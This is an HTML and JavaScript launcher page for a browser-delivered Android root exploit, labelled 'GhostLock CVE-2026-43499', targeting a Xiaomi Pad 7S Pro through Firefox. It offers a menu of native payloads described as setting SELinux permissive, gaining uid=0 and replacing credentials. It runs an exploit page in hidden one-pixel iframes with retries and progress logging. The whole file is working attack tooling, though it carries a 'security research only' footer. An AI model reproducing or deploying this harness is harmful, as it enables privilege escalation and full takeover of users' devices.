<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IonStack Violin</title>
<script>
const MAX_ATTEMPTS = 3;
const ATTEMPT_TIMEOUT_MS = 8000;
const RUN_ID = Date.now().toString(36) + Math.random().toString(36).slice(2);
const queryParams = new URLSearchParams(location.search);
const PRIVATE_DIR = "/data/data/org.mozilla.firefox/files";

const BANNER = [
  "",
  "  ╦╔═╔═╗╔╦╗╔═╗╦═╗╔╦╗",
  "  ║║ ║╣  ║ ║╣ ╠╦╝║║║",
  "  ╩╚═╚═╝ ╩ ╚═╝╩╚═╩ ╩",
  "  GhostLock CVE-2026-43499",
  "  Xiaomi Pad 7S Pro (violin)",
  "",
].join("\n");

let done = false;
let attempt = 0;
let timer = 0;
let confirmed = false;
let selectedPayload = "";
const frames = [];
let logElement = null;
let statusElement = null;

const PAYLOADS = {
  "r3": { name: "r3.so — permissive + root", file: "r3.so", desc: "SELinux permissive + uid=0" },
  "r4": { name: "r4.so — direct write", file: "r4.so", desc: "Direct pselect write path" },
  "p":  { name: "p.so — permissive only", file: "p.so", desc: "SELinux permissive (no root)" },
  "r2": { name: "r2.so — root v2", file: "r2.so", desc: "Root with cred replace" },
};

function childUrl(n) {
  const dir = location.pathname.replace(/[^/]*$/, "");
  return dir + "exploit.html?run=" + encodeURIComponent(RUN_ID) +
    "&attempt=" + n + "&payload=" + encodeURIComponent(selectedPayload);
}

function log(msg) {
  if (logElement) {
    logElement.textContent += msg + "\n";
    logElement.scrollTop = logElement.scrollHeight;
  }
  try { console.log(msg); } catch(e) {}
}

function setStatus(msg) {
  if (statusElement) statusElement.textContent = msg;
  document.title = msg;
}

function cleanupFrames() {
  for (const f of frames) { try { f.remove(); } catch(e) {} }
  frames.length = 0;
}

function releasePage() {
  if (done) return;
  done = true;
  clearTimeout(timer);
  cleanupFrames();
}

function showResult(lines, finalMessage) {
  cleanupFrames();
  const resultEl = document.getElementById("result");
  if (resultEl) {
    resultEl.style.display = "block";
    resultEl.textContent = (lines || []).join("\n") + (finalMessage ? "\n" + finalMessage : "");
  }
  setStatus("Done");
  log("[+] Exploit completed");
  try { navigator.vibrate && navigator.vibrate([200, 100, 200]); } catch(e) {}
}

function startAttempt() {
  if (done || confirmed || attempt >= MAX_ATTEMPTS) return;
  attempt++;
  setStatus("Attempt " + attempt + "/" + MAX_ATTEMPTS + " — launching...");
  log("[*] Attempt " + attempt + ": loading exploit iframe");

  const frame = document.createElement("iframe");
  frame.style.cssText = "position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01;pointer-events:none;border:0";
  frame.src = childUrl(attempt);
  frames.push(frame);
  document.body.appendChild(frame);

  timer = setTimeout(() => {
    if (!done) {
      log("[-] Attempt " + attempt + " timed out");
      try { frame.remove(); } catch(e) {}
      if (attempt < MAX_ATTEMPTS) {
        startAttempt();
      } else {
        setStatus("All attempts failed");
        log("[!] Max attempts reached. Try refreshing.");
      }
    }
  }, ATTEMPT_TIMEOUT_MS);
}

addEventListener("message", (event) => {
  const data = event.data;
  if (!data || data.run !== RUN_ID || done) return;

  if (data.type === "device") {
    clearTimeout(timer);
    const deviceId = String(data.deviceId || "").trim();
    const isSupported = data.isSupported === true;
    const msg = "Device: " + deviceId + "\n" +
      (isSupported ? "✓ Device supported. May reboot. Continue?" :
                     "⚠ Device NOT supported. Will likely reboot. Continue?");
    const ok = confirm(msg);
    if (!ok) { done = true; cleanupFrames(); setStatus("Cancelled"); return; }
    const final = confirm("Save your work. OK to proceed, Cancel to stop.");
    if (!final) { done = true; cleanupFrames(); setStatus("Cancelled"); return; }
    confirmed = true;
    try { event.source.postMessage({ type: "decision", run: RUN_ID, attempt: data.attempt, ok: true }, "*"); }
    catch(e) { done = true; cleanupFrames(); }
    return;
  }

  if (data.type === "stop") {
    done = true; clearTimeout(timer); cleanupFrames();
    setStatus("Stopped by exploit");
    return;
  }
  if (data.type === "fail") {
    clearTimeout(timer);
    if (confirmed) { done = true; cleanupFrames(); setStatus("Failed after confirmation"); return; }
    for (let i = 0; i < frames.length; i++) {
      try { if (frames[i].contentWindow === event.source) { frames[i].remove(); frames.splice(i, 1); break; } } catch(e) {}
    }
    log("[-] Attempt failed, retrying...");
    startAttempt();
    return;
  }
  if (data.type === "progress") {
    clearTimeout(timer);
    const lines = Array.isArray(data.lines) ? data.lines : [];
    for (const line of lines) log("  " + line);
    if (data.finalMessage) log(data.finalMessage);
    setStatus("Running...");
    return;
  }
  if (data.type === "success") {
    showResult(data.lines, data.finalMessage);
  }
});

addEventListener("pagehide", releasePage);

function buildUI() {
  const style = document.createElement("style");
  style.textContent = [
    "*{box-sizing:border-box;margin:0;padding:0}",
    "body{background:#080b0f;font-family:'Courier New',monospace;color:#c9d1d9}",
    "#wrap{display:flex;flex-direction:column;align-items:center;min-height:100svh;padding:clamp(16px,5vw,32px);gap:16px}",
    "#banner{color:#f85149;font-size:clamp(11px,2.8vw,14px);white-space:pre;text-align:center;text-shadow:0 0 10px rgba(248,81,73,0.5)}",
    "#divider{width:min(360px,90vw);border:none;border-top:1px solid #2a1a1a}",
    "#label{color:#554;font-size:clamp(10px,2.5vw,12px);letter-spacing:2px;text-transform:uppercase}",
    "#btns{display:flex;flex-direction:column;gap:10px;width:min(400px,92vw)}",
    ".btn{display:flex;flex-direction:column;gap:4px;padding:clamp(12px,3vw,16px) clamp(14px,4vw,20px);background:rgba(248,81,73,0.03);border:1px solid #3a1e1e;border-radius:8px;color:#f85149;font-family:inherit;cursor:pointer;text-align:left;transition:all .15s;-webkit-tap-highlight-color:transparent;touch-action:manipulation}",
    ".btn:hover{background:rgba(248,81,73,0.09);border-color:#f85149;box-shadow:0 0 16px rgba(248,81,73,0.2)}",
    ".btn:active{transform:scale(0.98)}",
    ".btn-tag{font-size:clamp(10px,2.5vw,11px);color:#554;letter-spacing:1px}",
    ".btn-name{font-size:clamp(12px,3.5vw,15px);color:#f85149}",
    ".btn-desc{font-size:clamp(10px,2.5vw,11px);color:#665}",
    "#status{color:#58a6ff;font-size:clamp(11px,2.8vw,13px);text-align:center;min-height:1.5em}",
    "#log{color:#8b949e;font-size:clamp(10px,2.5vw,12px);white-space:pre-wrap;max-height:40vh;overflow-y:auto;width:min(420px,92vw);padding:8px;background:#0d1117;border:1px solid #21262d;border-radius:6px;display:none}",
    "#result{color:#3fb950;font-size:clamp(11px,2.8vw,13px);white-space:pre-wrap;width:min(420px,92vw);padding:12px;background:#0d1117;border:1px solid #238636;border-radius:6px;display:none}",
    "#note{color:#443;font-size:clamp(10px,2.5vw,11px);text-align:center;max-width:min(360px,88vw);line-height:1.6}",
  ].join("\n");
  document.head.appendChild(style);

  const wrap = document.createElement("div");
  wrap.id = "wrap";
  document.body.appendChild(wrap);

  const banner = document.createElement("pre");
  banner.id = "banner";
  banner.textContent = BANNER;
  wrap.appendChild(banner);

  wrap.appendChild(Object.assign(document.createElement("hr"), { id: "divider" }));

  const label = document.createElement("div");
  label.id = "label";
  label.textContent = "// Select Payload";
  wrap.appendChild(label);

  const btns = document.createElement("div");
  btns.id = "btns";
  wrap.appendChild(btns);

  for (const [key, info] of Object.entries(PAYLOADS)) {
    const btn = document.createElement("button");
    btn.className = "btn";
    btn.innerHTML = '<span class="btn-tag">PAYLOAD</span><span class="btn-name">' + info.name + '</span><span class="btn-desc">' + info.desc + '</span>';
    btn.addEventListener("click", () => {
      selectedPayload = key;
      btns.style.display = "none";
      label.style.display = "none";
      logEl.style.display = "block";
      navigator.wakeLock && navigator.wakeLock.request("screen").catch(() => {});
      startAttempt();
    });
    btns.appendChild(btn);
  }

  const status = document.createElement("div");
  status.id = "status";
  status.textContent = "Select a payload to begin";
  wrap.appendChild(status);
  statusElement = status;

  const logEl = document.createElement("div");
  logEl.id = "log";
  wrap.appendChild(logEl);
  logElement = logEl;

  const result = document.createElement("div");
  result.id = "result";
  wrap.appendChild(result);

  const note = document.createElement("div");
  note.id = "note";
  note.textContent = "Xiaomi Pad 7S Pro (violin) · Android 16 · Kernel 6.6.77 · Firefox · 仅供安全研究";
  wrap.appendChild(note);
}

buildUI();
</script>
